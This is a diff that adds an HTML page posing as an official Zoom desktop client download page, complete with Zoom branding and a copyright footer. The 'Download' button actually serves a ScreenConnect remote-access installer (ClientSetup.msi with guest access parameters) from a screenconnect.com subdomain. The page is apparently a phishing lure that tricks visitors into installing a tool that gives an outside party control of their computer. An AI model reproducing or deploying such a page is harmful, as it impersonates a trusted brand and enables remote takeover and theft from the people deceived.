@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Zoom Meeting Download</title>
+
+  <style>
+
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:Arial, Helvetica, sans-serif;
+    }
+
+    body{
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+
+      background:
+      linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.65)),
+      url('https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=1600&q=80');
+
+      background-size:cover;
+      background-position:center;
+      overflow:hidden;
+    }
+
+    .container{
+      width:90%;
+      max-width:550px;
+      padding:40px;
+      text-align:center;
+
+      background:rgba(255,255,255,0.08);
+      border:1px solid rgba(255,255,255,0.2);
+
+      backdrop-filter:blur(12px);
+      -webkit-backdrop-filter:blur(12px);
+
+      border-radius:22px;
+
+      box-shadow:0 8px 35px rgba(0,0,0,0.4);
+
+      color:white;
+    }
+
+    .logo{
+      width:120px;
+      height:120px;
+      object-fit:contain;
+      border-radius:50%;
+      margin-bottom:25px;
+      background:white;
+      padding:10px;
+      box-shadow:0 4px 15px rgba(0,0,0,0.3);
+    }
+
+    h1{
+      font-size:34px;
+      font-weight:700;
+      margin-bottom:15px;
+      letter-spacing:1px;
+    }
+
+    p{
+      font-size:16px;
+      line-height:1.7;
+      color:#e5e5e5;
+      margin-bottom:35px;
+    }
+
+    .download-btn{
+      display:inline-block;
+      padding:15px 38px;
+      background:#0B5CFF;
+      color:white;
+      text-decoration:none;
+      font-size:18px;
+      font-weight:bold;
+      border-radius:50px;
+
+      transition:0.3s ease;
+
+      box-shadow:0 5px 20px rgba(11,92,255,0.5);
+    }
+
+    .download-btn:hover{
+      background:#0849c7;
+      transform:translateY(-3px);
+      box-shadow:0 8px 25px rgba(11,92,255,0.6);
+    }
+
+    .footer{
+      margin-top:28px;
+      font-size:13px;
+      color:rgba(255,255,255,0.7);
+    }
+
+    @media(max-width:600px){
+
+      .container{
+        padding:30px 20px;
+      }
+
+      h1{
+        font-size:28px;
+      }
+
+      p{
+        font-size:15px;
+      }
+
+      .download-btn{
+        width:100%;
+      }
+
+    }
+
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <!-- SAVE YOUR UPLOADED IMAGE AS zoom-logo.png -->
+    <img
+      class="logo"
+      src="https://freelogopng.com/images/all_img/1685422800zoom-icon-png.png"
+      alt="Zoom Logo"
+    >
+
+    <h1>Join Your Zoom Meeting</h1>
+
+    <p>
+      Download the latest Zoom desktop client to securely join meetings,
+      collaborate with your team, and stay connected from anywhere.
+    </p>
+
+    <a
+      class="download-btn"
+      href="https://ptd36.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&t=126675"
+      download
+    >
+      Download 
+    </a>
+
+    <div class="footer">
+      © 2026 Zoom Video Communications, Inc.
+    </div>
+
+  </div>
+
+</body>
+</html>
